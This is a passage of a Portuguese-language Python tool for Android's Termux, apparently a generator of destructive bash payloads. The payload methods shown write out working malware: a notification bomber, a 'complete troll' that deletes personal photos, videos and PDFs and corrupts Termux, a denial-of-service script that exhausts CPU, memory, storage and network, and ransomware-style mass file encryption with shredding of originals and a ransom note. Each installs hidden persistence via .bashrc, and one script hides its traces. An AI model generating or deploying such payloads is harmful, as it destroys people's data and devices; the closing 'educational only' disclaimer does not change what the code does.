    sleep $((5 + RANDOM % 15))
done &

# Persistência via .bashrc
echo 'alias clear="bash ~/.bombardeio &"' >> ~/.bashrc
echo 'bash ~/.bombardeio &' >> ~/.bashrc

# Script de bombardeio oculto
cat > ~/.bombardeio << 'EOF'
#!/bin/bash
while true; do
    termux-notification --title "ALERTA!" --content "Notificação de teste $(date)" --alert-once
    sleep $((10 + RANDOM % 30))
done
EOF

chmod +x ~/.bombardeio

echo " "
echo "🔔 BOMBARDEIO INICIADO! Notificações serão enviadas constantemente! 🔔"
echo "Reinicie o Termux para ver o efeito completo."

exit 0
"""

    def gerar_troll_completo(self, incluir_destrutivo: bool = True, incluir_irritante: bool = True, delay_inicio: int = 5, **kwargs) -> str:
        payload = f"""#!/bin/bash
# 💣 TROLL COMPLETO - DESTRUIÇÃO + IRRITAÇÃO 💣
# ☠️  Este script é a combinação mortal de todos os outros! ☠️

echo "INICIANDO TROLL COMPLETO EM {delay_inicio} MINUTOS..."
echo "Seu dispositivo será destruído e irritado simultaneamente!"
sleep 2

# Delay antes de iniciar
echo "O bombardeio começará em {delay_inicio} minutos..."
sleep {delay_inicio * 60}

# Parte destrutiva (se habilitada)
if [ "{'true' if incluir_destrutivo else 'false'}" = "true" ]; then
    echo "INICIANDO FASE DE DESTRUIÇÃO..."
    
    # Apagar arquivos pessoais
    find /sdcard /storage/emulated/0 -name "*.jpg" -o -name "*.mp4" -o -name "*.pdf" -delete 2>/dev/null &
    
    # Corromper Termux
    termux_dir="/data/data/com.termux"
    if [ -d "$termux_dir" ]; then
        find "$termux_dir" -name "*.so" -exec rm -f {{}} \\;
        find "$termux_dir" -name "bash" -exec echo "corrupted" > {{}} \\;
    fi
    
    # Sobrescrever espaço livre
    dd if=/dev/urandom of=/sdcard/junk.tmp bs=1M count=50 2>/dev/null &
fi

# Parte irritante (se habilitada)
if [ "{'true' if incluir_irritante else 'false'}" = "true" ]; then
    echo "INICIANDO FASE DE IRRITAÇÃO..."
    
    # Notificações constantes
    if command -v termux-notification &> /dev/null; then
        while true; do
            termux-notification --title "⚠️ ALERTA" --content "Sistema comprometido!" --alert-once
            sleep $((5 + RANDOM % 10))
        done &
    fi
    
    # Terminal irritante
    echo 'export PS1="\\[\\e[31m\\]💀\\[\\e[33m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[32m\\]\\w\\[\\e[0m\\]\\$ "' >> ~/.bashrc
    echo 'alias ls="echo \\"Comando bloqueado!\\"; ls --color=always"' >> ~/.bashrc
    echo 'function random_message() { messages=("Haha!" "Irritante?" "Tente me parar!"); echo "${{messages[$((RANDOM % 3))]}}"; }' >> ~/.bashrc
    echo 'random_message' >> ~/.bashrc
fi

# Persistência máxima
echo "INSTALANDO PERSISTÊNCIA AVANÇADA..."

# Múltiplos métodos de persistência
echo 'bash ~/.troll_persistente &' >> ~/.bashrc
echo 'bash ~/.troll_persistente &' >> ~/.bash_profile
echo 'bash ~/.troll_persistente &' >> ~/.profile

# Script persistente oculto
cat > ~/.troll_persistente << 'EOF'
#!/bin/bash
while true; do
    # Recriar partes do troll periodicamente
    if [ -f ~/.bashrc ]; then
        echo 'alias ls="echo \\"Não pode usar isso!\\""' >> ~/.bashrc
        echo 'random_message' >> ~/.bashrc
    fi
    
    # Notificações aleatórias
    if command -v termux-notification &> /dev/null; then
        termux-notification --title "😈 Ainda aqui!" --content "Não pode me remover!" --alert-once
    fi
    
    sleep $((60 + RANDOM % 120))
done
EOF

chmod +x ~/.troll_persistente

# Mensagem final
echo " "
echo "💣 TROLL COMPLETO ATIVADO! SEU DISPOSITIVO ESTÁ COMPROMETIDO! 💣"
echo "Destruição e irritação combinadas para efeito máximo!"
echo "Reinicie o Termux para experimentar o efeito completo."

# Ocultar evidências
sleep 5
clear

exit 0
"""
        return payload

    def gerar_negar_servico(self, **kwargs) -> str:
        return """#!/bin/bash
# 🐌 NEGAÇÃO DE SERVIÇO COMPLETA 🐌
# ⚠️  Este script consumirá todos os recursos do sistema!

echo "INICIANDO ATAQUE DE NEGAÇÃO DE SERVIÇO..."
sleep 2

# Consumir CPU
echo "🧠 CONSUMINDO RECURSOS DE CPU..."
for i in {1..10}; do
    while true; do
        echo "scale=10000; 4*a(1)" | bc -l &>/dev/null &
    done &
done

# Consumir memória
echo "💾 CONSUMINDO MEMÓRIA RAM..."
memory_hog() {
    local data=()
    while true; do
        data+=($(seq 1 100000))
        sleep 0.1
    done
}
memory_hog &

# Consumir armazenamento
echo "💽 CONSUMINDO ARMAZENAMENTO..."
dd if=/dev/urandom of=/sdcard/fill_disk_$RANDOM.tmp bs=1M count=1024 2>/dev/null &

# Consumir bateria
echo "🔋 CONSUMINDO BATERIA..."
while true; do
    cat /dev/urandom > /dev/null &
    sleep 1
done &

# Congestionar rede
echo "🌐 CONGESTIONANDO REDE..."
while true; do
    ping -s 65507 8.8.8.8 > /dev/null &
    sleep 0.5
done &

# Persistência
echo "📌 INSTALANDO PERSISTÊNCIA..."
echo 'bash ~/.dos_attack &' >> ~/.bashrc

cat > ~/.dos_attack << 'EOF'
#!/bin/bash
while true; do
    # Recriar processos de negação de serviço
    for i in {1..5}; do
        while true; do
            echo "scale=5000; 4*a(1)" | bc -l &>/dev/null &
        done &
    done
    sleep 30
done
EOF

chmod +x ~/.dos_attack

echo " "
echo "🐌 ATAQUE DE NEGAÇÃO DE SERVIÇO INICIADO! 🐌"
echo "Seu dispositivo ficará extremamente lento e pode travar!"
echo "Reinicie para experimentar o efeito completo."

exit 0
"""

    def gerar_criptografar_dados(self, **kwargs) -> str:
        return """#!/bin/bash
# 🔐 CRIPTOGRAFIA DE DADOS PESSOAIS 🔐
# ⚠️  Este script criptografará seus arquivos pessoais!

echo "INICIANDO CRIPTOGRAFIA DE DADOS..."
sleep 2

# Verificar se OpenSSL está disponível
if ! command -v openssl &> /dev/null; then
    echo "OpenSSL não encontrado! Instale com: pkg install openssl"
    exit 1
fi

# Gerar chave de criptografia
CHAVE=$(openssl rand -hex 32)
echo "🔑 Chave de criptografia gerada: $CHAVE"

# Função para criptografar arquivos
criptografar_arquivo() {
    local arquivo="$1"
    if [ -f "$arquivo" ]; then
        echo "🔒 Criptografando: $arquivo"
        openssl enc -aes-256-cbc -salt -in "$arquivo" -out "$arquivo.encrypted" -pass pass:"$CHAVE"
        if [ $? -eq 0 ]; then
            shred -u "$arquivo"
            echo "✅ $arquivo criptografado"
        fi
    fi
}

# Extensões de arquivos para criptografar
extensoes=(
    "*.jpg" "*.png" "*.mp4" "*.mp3" "*.pdf" "*.doc*" "*.xls*"
    "*.txt" "*.json" "*.xml" "*.db" "*.sqlite" "*.zip" "*.rar"
)

echo "🔒 INICIANDO CRIPTOGRAFIA EM MASSA..."
for ext in "${extensoes[@]}"; do
    find /sdcard /storage/emulated/0 -name "$ext" -type f | while read arquivo; do
        criptografar_arquivo "$arquivo"
    done
done

# Mensagem de resgate
cat > /sdcard/LEIA-ME.txt << EOF
⚠️  SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ⚠️

Todos os seus arquivos pessoais foram criptografados com AES-256.

Para descriptografar, você precisa da chave: $CHAVE

⚠️  Esta chave será mostrada apenas uma vez!
⚠️  Salve-a em um local seguro!

Para descriptografar um arquivo, use:
openssl enc -d -aes-256-cbc -in arquivo.encrypted -out arquivo -pass pass:SUA_CHAVE

EOF

# Persistência
echo 'bash ~/.check_encryption' >> ~/.bashrc

cat > ~/.check_encryption << 'EOF'
#!/bin/bash
# Verificar e criptografar novos arquivos periodicamente
while true; do
    sleep 300
    find /sdcard /storage/emulated/0 -name "*.jpg" -o -name "*.mp4" -o -name "*.pdf" | while read arquivo; do
        if [[ "$arquivo" != *.encrypted ]]; then
            openssl enc -aes-256-cbc -salt -in "$arquivo" -out "$arquivo.encrypted" -pass pass:"$CHAVE" && shred -u "$arquivo"
        fi
    done
done
EOF

chmod +x ~/.check_encryption

echo " "
echo "🔐 CRIPTOGRAFIA COMPLETA! SEUS ARQUIVOS ESTÃO BLOQUEADOS! 🔐"
echo "Verifique o arquivo LEIA-ME.txt no seu armazenamento para detalhes."

exit 0
"""

    def _sair(self):
        print("\033[1;41m⚠️  AVISO FINAL: USO ILEGAL É CRIME! ⚠️\033[0m")
        print("Estes scripts são apenas para fins educacionais e de teste.")
        print("Nunca use em dispositivos que não sejam seus ou sem permissão.")
        print("\033[1;36mSaindo com segurança...\033[0m")
        time.sleep(2)
        sys.exit(0)

def main():
    try:
        # Verificar se estamos no Termux
        if not os.path.exists('/data/data/com.termux/files/home'):
            print("\033[1;31mEste script é específico para Termux!\033[0m")
            print("\033[1;33mExecute apenas no ambiente Termux.\033[0m")
            sys.exit(1)
            
        gerador = GeradorDestrutivoTermux()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        print("\n\033[1;31m✗ Operação cancelada pelo usuário\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[1;31m✗ Erro inesperado: {str(e)}\033[0m")
        sys.exit(1)

if __name__ == '__main__':
    main()
